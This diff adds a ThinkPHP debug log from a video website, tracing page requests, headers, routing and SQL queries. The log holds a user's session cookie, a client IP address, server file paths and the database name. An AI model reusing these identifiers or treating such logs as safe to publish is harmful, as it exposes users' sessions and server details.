+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'single',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; jiathis_rdc=%7B%22http%3A//tp.chenjiangjiang.cn/index/video/single/vid/22%22%3A%220%7C1519728691052%22%7D; hzy_login_back=http://tp.chenjiangjiang.cn/index/video/tv/cid/31',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/video/tv/cid/4',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'vid' => '32',
+)
+[ info ] [ RUN ] app\index\controller\Video->single[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/video/single.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data',
+  3 => 'info',
+  4 => 'count',
+  5 => 'data3',
+  6 => 'sc',
+  7 => 'xname',
+  8 => 'dname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000214s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000720s ]
+[ sql ] [ SQL ] SELECT `xcid` FROM `bw_video` WHERE  `vid` = 32 LIMIT 1 [ RunTime:0.000242s ]
+[ sql ] [ SQL ] SELECT `dcid` FROM `bw_video` WHERE  `vid` = 32 LIMIT 1 [ RunTime:0.000162s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000527s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 44 LIMIT 1 [ RunTime:0.000129s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 4 LIMIT 1 [ RunTime:0.000112s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vid` = 32 LIMIT 1 [ RunTime:0.000196s ]
+[ sql ] [ SQL ] UPDATE `bw_video`  SET `vplay`=10  WHERE  `vid` = 32 [ RunTime:0.000276s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000130s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000128s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vid` = 32  AND `isdel` = '0' [ RunTime:0.000258s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_reply` [ RunTime:0.000481s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_reply` WHERE  `vid` = 32  AND `isdel` = '0' [ RunTime:0.000204s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_reply` WHERE  `vid` = 32  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000197s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `xcid` = 44  AND `isdel` = '0' ORDER BY `vplay`  desc LIMIT 5 [ RunTime:0.000241s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_scang` [ RunTime:0.000458s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_scang` WHERE  `uid` IS NULL  AND `vid` = 32 [ RunTime:0.000225s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:50:59+08:00 ] 111.206.170.62 GET /index/video/getData/vid/32
+[ info ] tp.chenjiangjiang.cn/index/video/getData/vid/32 [运行时间：0.012740s][吞吐率：78.49req/s] [内存消耗：1,605.01kb] [文件加载：46]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'getData',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; jiathis_rdc=%7B%22http%3A//tp.chenjiangjiang.cn/index/video/single/vid/22%22%3A%220%7C1519728691052%22%7D; hzy_login_back=http://tp.chenjiangjiang.cn/index/video/tv/cid/31',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/video/single/vid/32',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'vid' => '32',
+)
+[ info ] [ RUN ] app\index\controller\Video->getData[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ LOG ] INIT File
